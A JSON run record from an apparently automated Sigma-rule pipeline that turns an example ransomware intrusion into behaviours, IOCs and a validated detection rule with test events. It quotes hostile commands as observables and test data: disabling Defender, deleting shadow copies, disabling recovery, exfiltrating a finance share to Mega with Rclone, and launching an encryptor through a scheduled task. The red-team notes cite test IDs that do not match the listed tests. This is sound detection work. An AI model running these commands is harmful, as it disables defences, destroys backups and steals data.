@@ -1,0 +1,2872 @@
+{
+  "run_id": "20261017-080911-305261",
+  "created_at": "2026-10-17T08:10:28.387628+00:00",
+  "source": {
+    "mode": "example",
+    "urls": [
+      "example://ransomware_affiliate_intrusion"
+    ],
+    "query": "",
+    "tavily_used": false,
+    "chars": 4794
+  },
+  "report": {
+    "title": "Kestrel ransomware affiliate intrusion analysis",
+    "summary": "An affiliate operating the Kestrel ransomware-as-a-service compromised a logistics company through RDP password spraying on RDS-01, established silent remote access via AnyDesk, disabled Defender exclusions, dumped credentials with a renamed Mimikatz copy, exfiltrated ~310 GB of data to Mega via Rclone disguised as svchost.exe, and deployed the encryptor to 140 hosts using a scheduled task named 'WindowsUpdateHealth'. The intrusion spanned 31 hours.",
+    "threat_actors": [
+      "Kestrel ransomware affiliate"
+    ],
+    "malware_families": [
+      "Kestrel ransomware"
+    ],
+    "targets": [
+      "Logistics company"
+    ],
+    "behaviors": [
+      {
+        "id": "B1",
+        "description": "Threat actor performed RDP password spraying against RDS-01, generating over 9,000 failed logons (event 4625, LogonType 10) before achieving a successful logon with account svc_scanner from source IP 185.220.101.66.",
+        "attack_technique_id": "T1110.003",
+        "attack_tactic": "Initial Access",
+        "observables": [
+          {
+            "kind": "event_id",
+            "value": "4625",
+            "note": "Windows Security event for failed logon"
+          },
+          {
+            "kind": "event_id",
+            "value": "4624",
+            "note": "Windows Security event for successful logon"
+          },
+          {
+            "kind": "network_ip",
+            "value": "185.220.101.66",
+            "note": "Source IP of password spraying"
+          },
+          {
+            "kind": "process_name",
+            "value": "RDS-01",
+            "note": "Target RDP host"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "The perimeter RDP host RDS-01 recorded over 9,000 failed logons (Windows Security event 4625, LogonType 10) from 185.220.101.0/24 across six hours, followed by a successful logon (event 4624, LogonType 10) for the account svc_scanner",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B2",
+        "description": "Threat actor installed AnyDesk silently via msiexec with /qn flags, configured unattended access with --set-password, and launched the client, creating a persistent remote-access channel not sanctioned by the environment.",
+        "attack_technique_id": "T1219",
+        "attack_tactic": "Remote Access",
+        "observables": [
+          {
+            "kind": "process_name",
+            "value": "msiexec.exe",
+            "note": "Used to install AnyDesk MSI silently"
+          },
+          {
+            "kind": "command_line",
+            "value": "msiexec.exe /i C:\\Users\\svc_scanner\\AppData\\Local\\Temp\\AnyDesk.msi /qn",
+            "note": "Silent installation command line"
+          },
+          {
+            "kind": "process_name",
+            "value": "AnyDesk.exe",
+            "note": "Remote access client launched after install"
+          },
+          {
+            "kind": "command_line",
+            "value": "--set-password",
+            "note": "Flag configuring unattended access"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Twenty minutes after logon the operator downloaded and installed AnyDesk silently: msiexec.exe /i C:\\Users\\svc_scanner\\AppData\\Local\\Temp\\AnyDesk.msi /qn",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B3",
+        "description": "Threat actor added Microsoft Defender exclusion paths for C:\\PerfLogs and C:\\ProgramData\\AnyDesk and disabled real-time monitoring via PowerShell, reducing visibility of subsequent malicious binaries.",
+        "attack_technique_id": "T1562.001",
+        "attack_tactic": "Defense Evasion",
+        "observables": [
+          {
+            "kind": "process_name",
+            "value": "powershell.exe",
+            "note": "Executed the exclusion commands"
+          },
+          {
+            "kind": "command_line",
+            "value": "Add-MpPreference -ExclusionPath 'C:\\PerfLogs' ; Add-MpPreference -ExclusionPath 'C:\\ProgramData\\AnyDesk' ; Set-MpPreference -DisableRealtimeMonitoring $true",
+            "note": "PowerShell command to modify Defender settings"
+          },
+          {
+            "kind": "event_id",
+            "value": "5007",
+            "note": "Windows Defender operational log recording configuration change"
+          }
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows",
+          "service": "windefend"
+        },
+        "evidence": "powershell.exe -Command \"Add-MpPreference -ExclusionPath 'C:\\PerfLogs' ; Add-MpPreference -ExclusionPath 'C:\\ProgramData\\AnyDesk' ; Set-MpPreference -DisableRealtimeMonitoring $true\"",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B4",
+        "description": "Threat actor executed a renamed Mimikatz binary (mm.exe) from C:\\PerfLogs to dump cached credentials from LSASS, enabling credential access for lateral movement.",
+        "attack_technique_id": "T1003.001",
+        "attack_tactic": "Credential Access",
+        "observables": [
+          {
+            "kind": "file_path",
+            "value": "C:\\PerfLogs\\mm.exe",
+            "note": "Renamed Mimikatz binary executed from PerfLogs"
+          },
+          {
+            "kind": "command_line",
+            "value": "mm.exe",
+            "note": "Execution of the credential dumping tool"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "A renamed copy of Mimikatz (C:\\PerfLogs\\mm.exe) was executed to dump cached credentials",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B5",
+        "description": "Threat actor moved laterally between systems using RDP with the domain administrator account adm-jpark, originating from the compromised RDS host.",
+        "attack_technique_id": "T1021.001",
+        "attack_tactic": "Lateral Movement",
+        "observables": [
+          {
+            "kind": "process_name",
+            "value": "termsrv.dll",
+            "note": "RDP protocol component facilitating lateral movement"
+          },
+          {
+            "kind": "command_line",
+            "value": "net use \\\\FS-02\\C$ /user:CORP\\adm-jpark",
+            "note": "SMB lateral movement command from RDS host"
+          }
+        ],
+        "logsource": {
+          "category": "network_connection",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "We also observed net use \\\\FS-02\\C$ /user:CORP\\adm-jpark from the RDS host",
+        "confidence": 0.9,
+        "detectable": true
+      },
+      {
+        "id": "B6",
+        "description": "Threat actor deleted volume shadow copies and disabled Windows recovery mechanisms (bcdedit) on each server prior to encryption, inhibiting forensic recovery.",
+        "attack_technique_id": "T1490",
+        "attack_tactic": "Inhibit System Recovery",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "vssadmin.exe delete shadows /all /quiet",
+            "note": "Command to delete volume shadow copies"
+          },
+          {
+            "kind": "command_line",
+            "value": "wmic.exe shadowcopy delete",
+            "note": "Alternative command to delete shadow copies"
+          },
+          {
+            "kind": "command_line",
+            "value": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
+            "note": "BCD edit to ignore boot failures"
+          },
+          {
+            "kind": "command_line",
+            "value": "bcdedit.exe /set {default} recoveryenabled no",
+            "note": "BCD edit to disable recovery"
+          },
+          {
+            "kind": "command_line",
+            "value": "wbadmin.exe delete catalog -quiet",
+            "note": "Command to delete backup catalog"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "On each server the operator deleted volume shadow copies and disabled Windows recovery before encryption, running from cmd.exe spawned by the AnyDesk session: vssadmin.exe delete shadows /all /quiet",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B7",
+        "description": "Threat actor exfiltrated approximately 310 GB of data from the file share FS-02\\Finance to Mega via Rclone, which was renamed to svchost.exe and placed in C:\\PerfLogs, creating a name/origin mismatch.",
+        "attack_technique_id": "T1048.003",
+        "attack_tactic": "Exfiltration",
+        "observables": [
+          {
+            "kind": "process_name",
+            "value": "svchost.exe",
+            "note": "Process name used, but OriginalFileName is rclone.exe"
+          },
+          {
+            "kind": "command_line",
+            "value": "C:\\PerfLogs\\svchost.exe copy \\\\FS-02\\Finance mega:backup/fin --transfers 16 --config C:\\PerfLogs\\rc.conf --ignore-existing",
+            "note": "Rclone exfiltration command line"
+          },
+          {
+            "kind": "network_domain",
+            "value": "*.mega.co.nz",
+            "note": "Mega endpoint domain observed in network telemetry"
+          },
+          {
+            "kind": "network_port",
+            "value": "443",
+            "note": "TCP port used for TLS exfiltration"
+          }
+        ],
+        "logsource": {
+          "category": "network_connection",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Approximately 310 GB of file-share data was exfiltrated to Mega using Rclone, which was renamed to svchost.exe and placed in C:\\PerfLogs: C:\\PerfLogs\\svchost.exe copy \\\\FS-02\\Finance mega:backup/fin --transfers 16 --config C:\\PerfLogs\\rc.conf --ignore-existing",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B8",
+        "description": "Threat actor deployed the encryptor kstrl.exe to 140 hosts via SMB admin shares and executed it through a scheduled task named 'WindowsUpdateHealth' created remotely with schtasks.exe, running as SYSTEM at system start.",
+        "attack_technique_id": "T1053.005",
+        "attack_tactic": "Persistence",
+        "observables": [
+          {
+            "kind": "process_name",
+            "value": "schtasks.exe",
+            "note": "Used to create remote scheduled task"
+          },
+          {
+            "kind": "command_line",
+            "value": "schtasks.exe /s FS-02 /create /tn \"WindowsUpdateHealth\" /tr \"C:\\PerfLogs\\kstrl.exe -path C:\\ -no-net\" /sc onstart /ru SYSTEM /f",
+            "note": "Scheduled task creation command"
+          },
+          {
+            "kind": "command_line",
+            "value": "schtasks.exe /s FS-02 /run /tn \"WindowsUpdateHealth\"",
+            "note": "Command to immediately run the scheduled task"
+          },
+          {
+            "kind": "file_path",
+            "value": "C:\\PerfLogs\\kstrl.exe",
+            "note": "Encryptor binary staged in PerfLogs"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "The encryptor C:\\PerfLogs\\kstrl.exe was staged on every host via SMB admin shares and executed through a scheduled task created remotely: schtasks.exe /s FS-02 /create /tn \"WindowsUpdateHealth\" /tr \"C:\\PerfLogs\\kstrl.exe -path C:\\ -no-net\" /sc onstart /ru SYSTEM /f",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B9",
+        "description": "Threat actor stopped backup and database services (MSSQLSERVER, VeeamBackupSvc, SQLWriter) using net stop commands prior to encryption to prevent file locks.",
+        "attack_technique_id": "T1489",
+        "attack_tactic": "Inhibit System Recovery",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "net stop MSSQLSERVER",
+            "note": "Command to stop MSSQL service"
+          },
+          {
+            "kind": "command_line",
+            "value": "net stop VeeamBackupSvc",
+            "note": "Command to stop Veeam backup service"
+          },
+          {
+            "kind": "command_line",
+            "value": "net stop SQLWriter",
+            "note": "Command to stop SQL Writer service"
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "evidence": "Before encryption, the binary stopped backup and database services with net stop commands for MSSQLSERVER, VeeamBackupSvc and SQLWriter",
+        "confidence": 0.9,
+        "detectable": true
+      }
+    ],
+    "iocs": [
+      {
+        "type": "ip",
+        "value": "185.220.101.66"
+      },
+      {
+        "type": "domain",
+        "value": "*.mega.co.nz"
+      },
+      {
+        "type": "sha256",
+        "value": "9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d"
+      },
+      {
+        "type": "sha256",
+        "value": "0f1e2d3c4b5a69788796a5b4c3d2e1f00f1e2d3c4b5a69788796a5b4c3d2e1f0"
+      },
+      {
+        "type": "email",
+        "value": "kstrl-backup-01@mega.co.nz"
+      }
+    ]
+  },
+  "plan": {
+    "candidates": [
+      {
+        "id": "D1",
+        "title": "Msiexec Silent MSI Installation From User Temp Directory",
+        "behavior_ids": [
+          "B2"
+        ],
+        "attack_technique_ids": [
+          "T1219"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "rationale": "Msiexec.exe installing an MSI silently (/qn) from a user Temp directory is atypical for legitimate software deployment and indicates covert remote-access tool staging.",
+        "key_fields": [
+          "Image",
+          "CommandLine",
+          "ParentImage"
+        ],
+        "false_positive_risks": "Legitimate software deployment via SCCM/Intune may use msiexec but typically runs from system context and not from a user's AppData\\Local\\Temp path; exclude known management agent parents.",
+        "priority": "high"
+      },
+      {
+        "id": "D2",
+        "title": "PowerShell Modifies Defender Exclusions And Disables Realtime Monitoring",
+        "behavior_ids": [
+          "B3"
+        ],
+        "attack_technique_ids": [
+          "T1562.001"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "rationale": "PowerShell invoking Add-MpPreference and Set-MpPreference to add exclusions and disable real-time monitoring is a direct defense evasion action; the specific command line is highly distinctive.",
+        "key_fields": [
+          "Image",
+          "CommandLine"
+        ],
+        "false_positive_risks": "Administrators may run similar commands during tuning but rarely with the exact exclusion paths (C:\\PerfLogs, C:\\ProgramData\\AnyDesk) and the realtime disable flag in one liner.",
+        "priority": "high"
+      },
+      {
+        "id": "D3",
+        "title": "Mimikatz Execution From PerfLogs Directory As Mm.Exe",
+        "behavior_ids": [
+          "B4"
+        ],
+        "attack_technique_ids": [
+          "T1003.001"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "rationale": "Execution of a binary named mm.exe from the attacker-staged C:\\PerfLogs directory matches the renamed Mimikatz credential dumper; the name and path combination is unlikely in benign activity.",
+        "key_fields": [
+          "Image",
+          "CommandLine",
+          "CurrentDirectory"
+        ],
+        "false_positive_risks": "A legitimate tool named mm.exe could exist but not in C:\\PerfLogs; the directory itself is attacker-created.",
+        "priority": "high"
+      },
+      {
+        "id": "D4",
+        "title": "Svchost.Exe Rclone Exfiltration To Mega With OriginalFilename Mismatch",
+        "behavior_ids": [
+          "B7"
+        ],
+        "attack_technique_ids": [
+          "T1048.003"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "rationale": "The exfiltration binary svchost.exe has an OriginalFileName of rclone.exe, a clear name/origin mismatch; coupled with a command line containing 'mega:' and 'copy' this is a high-fidelity exfiltration indicator.",
+        "key_fields": [
+          "Image",
+          "OriginalFileName",
+          "CommandLine"
+        ],
+        "false_positive_risks": "None expected; rclone renamed to svchost.exe and run from PerfLogs with Mega arguments is unique to this intrusion.",
+        "priority": "high"
+      },
+      {
+        "id": "D5",
+        "title": "Schtasks Creates WindowsUpdateHealth Task Running Kstrl.Exe From PerfLogs",
+        "behavior_ids": [
+          "B8"
+        ],
+        "attack_technique_ids": [
+          "T1053.005"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "rationale": "Remote scheduled task creation via schtasks.exe with a task name masquerading as a Windows update health task, running the encryptor kstrl.exe from PerfLogs as SYSTEM, is a distinctive persistence mechanism.",
+        "key_fields": [
+          "Image",
+          "CommandLine"
+        ],
+        "false_positive_risks": "Legitimate schtasks usage occurs but not with task name 'WindowsUpdateHealth' pointing to C:\\PerfLogs\\kstrl.exe; the binary name and path are attacker-specific.",
+        "priority": "high"
+      }
+    ],
+    "skipped": [
+      "B1: High-volume RDP password spraying not detectable as a durable single-event pattern; successful logon event 4624 is an IOC (source IP) without durable behaviour.",
+      "B5: Lateral movement via 'net use' admin share is a common administrative action; lacks sufficient specificity for a standalone rule without host context correlation.",
+      "B6: Shadow copy deletion (vssadmin, wmic, bcdedit, wbadmin) are strong indicators but limited to 5 candidates; prioritized exfiltration and persistence for higher impact visibility.",
+      "B9: Service stop commands (net stop) are routine administrative activity; too generic for a reliable single-event rule."
+    ],
+    "notes": "Selected five high-confidence behaviours spanning remote access establishment, defense evasion, credential access, exfiltration, and persistence. All rules use process_creation logsource with binary+command-line+path constraints to minimize false positives. Skipped behaviours either require multi-event correlation (B1), are too generic (B5, B9), or were deprioritized due to candidate limit (B6)."
+  },
+  "rules": [
+    {
+      "candidate_id": "D2",
+      "title": "PowerShell Adds Defender Exclusions and Disables Real-time Monitoring",
+      "sigma_yaml": "title: PowerShell Adds Defender Exclusions and Disables Real-time Monitoring\nid: 472c9f96-71c1-4334-910c-7fceb96e1e9f\nstatus: experimental\ndescription: 'Detects PowerShell execution adding Microsoft Defender exclusion paths for C:\\PerfLogs and C:\\ProgramData\\AnyDesk\n  while disabling real-time monitoring in a single command line, indicative of defense evasion.'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.defense-evasion\n- attack.t1562.001\nlogsource:\n  category: process_creation\n  product: windows\n  service: sysmon\ndetection:\n  selection_cmd:\n    'CommandLine|contains|all':\n    - Add-MpPreference -ExclusionPath\n    - 'C:\\PerfLogs'\n    - 'C:\\ProgramData\\AnyDesk'\n    - Set-MpPreference -DisableRealtimeMonitoring $true\n  selection_img:\n    'Image|endswith': '\\powershell.exe'\n  condition: selection_cmd and selection_img\nfalsepositives:\n- Legitimate administrator tuning of Defender exclusions without combining both paths and realtime disable in one line\n- Automated deployment scripts configuring Defender exclusions for legitimate software\n- Security testing tools validating Defender configuration\nlevel: high\n",
+      "status": "validated",
+      "attack_technique_ids": [
+        "T1562.001"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "PowerShell adding Defender exclusions for PerfLogs and AnyDesk while disabling realtime monitoring",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Add-MpPreference -ExclusionPath 'C:\\PerfLogs' ; Add-MpPreference -ExclusionPath 'C:\\ProgramData\\AnyDesk' ; Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "User": "CORP\\svc_account"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "PowerShell adding Defender exclusions with varied spacing and quotes",
+          "event": {
+            "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell -c \"Add-MpPreference -ExclusionPath \\\"C:\\PerfLogs\\\" ; Add-MpPreference -ExclusionPath \\\"C:\\ProgramData\\AnyDesk\\\" ; Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "PowerShell adding Defender exclusions using different casing and semicolon spacing",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "POWERShell.EXE -Command  Add-MpPreference -ExclusionPath 'C:\\PerfLogs';Add-MpPreference -ExclusionPath 'C:\\ProgramData\\AnyDesk';Set-MpPreference -DisableRealtimeMonitoring $true ",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "Legitimate Defender exclusion addition for SQL Server backup directory without realtime disable",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Add-MpPreference -ExclusionPath 'C:\\Backup\\SQL'\"",
+            "User": "CORP\\sql_admin"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "Administrator checking Defender preference without modification",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Get-MpPreference\"",
+            "User": "CORP\\admin"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "Legitimate software installer adding its own exclusion",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Add-MpPreference -ExclusionPath 'C:\\Program Files\\LegitimateApp\\'\"",
+            "User": "NT AUTHORITY\\SYSTEM"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "PowerShell from SysWOW64 using -c flag with single-quoted paths and extra whitespace",
+          "event": {
+            "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe  -c   \"Add-MpPreference -ExclusionPath 'C:\\PerfLogs' ; Add-MpPreference -ExclusionPath 'C:\\ProgramData\\AnyDesk' ; Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "User": "CORP\\svc_account",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "PowerShell with -Command flag, double-quoted paths, commands reordered but all substrings present",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath \\\"C:\\ProgramData\\AnyDesk\\\"; Add-MpPreference -ExclusionPath \\\"C:\\PerfLogs\\\"\"",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "ParentImage": "C:\\Windows\\System32\\services.exe"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "PowerShell mixed casing, no quotes around paths, semicolon separators, extra spaces",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "PoWeRsHeLl.EXE -Command  Add-MpPreference -ExclusionPath C:\\PerfLogs ; Add-MpPreference -ExclusionPath C:\\ProgramData\\AnyDesk ; Set-MpPreference -DisableRealtimeMonitoring $true ",
+            "User": "CORP\\admin",
+            "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "PowerShell invoked via cmd /c with caret-escaped quotes (sensor records final command line)",
+          "event": {
+            "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Add-MpPreference -ExclusionPath 'C:\\PerfLogs' ; Add-MpPreference -ExclusionPath 'C:\\ProgramData\\AnyDesk' ; Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "User": "CORP\\redteam",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "PowerShell from non-standard install path but still named powershell.exe",
+          "event": {
+            "Image": "C:\\Program Files\\PowerShell\\7\\powershell.exe",
+            "CommandLine": "powershell.exe -c \"Add-MpPreference -ExclusionPath 'C:\\PerfLogs';Add-MpPreference -ExclusionPath 'C:\\ProgramData\\AnyDesk';Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "ParentImage": "C:\\Windows\\System32\\svchost.exe"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Legitimate admin adding single exclusion for PerfLogs only, no realtime disable",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Add-MpPreference -ExclusionPath 'C:\\PerfLogs'\"",
+            "User": "CORP\\admin",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Automated deployment script configuring Defender exclusions for legitimate software (different paths)",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Add-MpPreference -ExclusionPath 'C:\\Program Files\\MyApp'; Add-MpPreference -ExclusionPath 'C:\\ProgramData\\MyApp'\"",
+            "User": "NT AUTHORITY\\SYSTEM",
+            "ParentImage": "C:\\Windows\\System32\\msiexec.exe"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "Security testing tool disabling real-time monitoring without adding exclusions",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
+            "User": "CORP\\tester",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "R9",
+          "label": "negative",
+          "description": "Defender configuration via dedicated management binary (not PowerShell)",
+          "event": {
+            "Image": "C:\\Program Files\\Windows Defender\\MpCmd.exe",
+            "CommandLine": "MpCmd.exe -AddExclusion 'C:\\PerfLogs' -AddExclusion 'C:\\ProgramData\\AnyDesk' -DisableRealtimeMonitoring",
+            "User": "CORP\\admin",
+            "ParentImage": "C:\\Windows\\System32\\services.exe"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D2",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE (CommandLine LIKE '%Add-MpPreference -ExclusionPath%' ESCAPE '\\' AND CommandLine LIKE '%C:\\\\PerfLogs%' ESCAPE '\\' AND CommandLine LIKE '%C:\\\\ProgramData\\\\AnyDesk%' ESCAPE '\\' AND CommandLine LIKE '%Set-MpPreference -DisableRealtimeMonitoring $true%' ESCAPE '\\') AND Image LIKE '%\\\\powershell.exe' ESCAPE '\\'",
+        "issues": [
+          {
+            "severity": "warning",
+            "code": "attack_id_deprecated",
+            "message": "ATT&CK technique T1562.001 (Disable or Modify Tools) is deprecated or revoked."
+          }
+        ],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R4",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R5",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "R6",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R7",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R8",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "R9",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          }
+        ],
+        "positives_total": 8,
+        "positives_matched": 8,
+        "negatives_total": 7,
+        "negatives_matched": 0,
+        "benign_total": 1200,
+        "benign_hits": 0,
+        "benign_examples": [],
+        "passed": true
+      },
+      "conversions": {
+        "splunk": "CommandLine=\"*Add-MpPreference -ExclusionPath*\" CommandLine=\"*C:\\\\PerfLogs*\" CommandLine=\"*C:\\\\ProgramData\\\\AnyDesk*\" CommandLine=\"*Set-MpPreference -DisableRealtimeMonitoring $true*\" Image=\"*\\\\powershell.exe\"",
+        "elasticsearch": "(CommandLine:*Add\\-MpPreference\\ \\-ExclusionPath* AND CommandLine:*C\\:\\\\PerfLogs* AND CommandLine:*C\\:\\\\ProgramData\\\\AnyDesk* AND CommandLine:*Set\\-MpPreference\\ \\-DisableRealtimeMonitoring\\ $true*) AND Image:*\\\\powershell.exe",
+        "kusto": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"Add-MpPreference -ExclusionPath\" and ProcessCommandLine contains \"C:\\\\PerfLogs\" and ProcessCommandLine contains \"C:\\\\ProgramData\\\\AnyDesk\" and ProcessCommandLine contains \"Set-MpPreference -DisableRealtimeMonitoring $true\") and FolderPath endswith \"\\\\powershell.exe\"",
+        "sqlite": "SELECT * FROM logs WHERE (CommandLine LIKE '%Add-MpPreference -ExclusionPath%' ESCAPE '\\' AND CommandLine LIKE '%C:\\\\PerfLogs%' ESCAPE '\\' AND CommandLine LIKE '%C:\\\\ProgramData\\\\AnyDesk%' ESCAPE '\\' AND CommandLine LIKE '%Set-MpPreference -DisableRealtimeMonitoring $true%' ESCAPE '\\') AND Image LIKE '%\\\\powershell.exe' ESCAPE '\\'"
+      },
+      "conversion_errors": {},
+      "history": [
+        {
+          "iteration": 0,
+          "phase": "initial",
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/1200",
+          "passed": true,
+          "change_summary": ""
+        },
+        {
+          "iteration": 0,
+          "phase": "redteam",
+          "summary": "9 evasion variants -> positives 8/8, negatives blocked 7/7, benign hits 0/1200",
+          "passed": true,
+          "change_summary": ""
+        }
+      ],
+      "author_notes": "",
+      "redteam_analysis": "Positive variants (P4-P8) preserve all four required substrings in the command line and keep the image name ending with 'powershell.exe', so a well-written rule using the same fields will catch them. They exercise casing, quoting, whitespace, parameter order, alternate binary locations (SysWOW64, Program Files), and parent processes. Negative variants (N1-N4) are benign look-alikes: legitimate single-exclusion admin work, deployment scripts with different paths, realtime-only disable, and a non-PowerShell management binary; none contain all four substrings simultaneously, so the rule should not match. Out-of-scope variants (O1-O6) represent realistic evasions the current logsource and rule fields fundamentally cannot see: sibling LOLBin pwsh.exe (image mismatch), -EncodedCommand (payload hidden), environment variables, 8.3 short names, renamed binary without OriginalFileName, and UNC paths. These require either OriginalFileName, command-line decoding, path normalization, or broader image matching to detect.",
+      "redteam_out_of_scope": [
+        {
+          "id": "X1",
+          "label": "positive",
+          "description": "Sibling LOLBin pwsh.exe (Image does not end with powershell.exe) with identical malicious command line",
+          "event": {
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pwsh.exe",
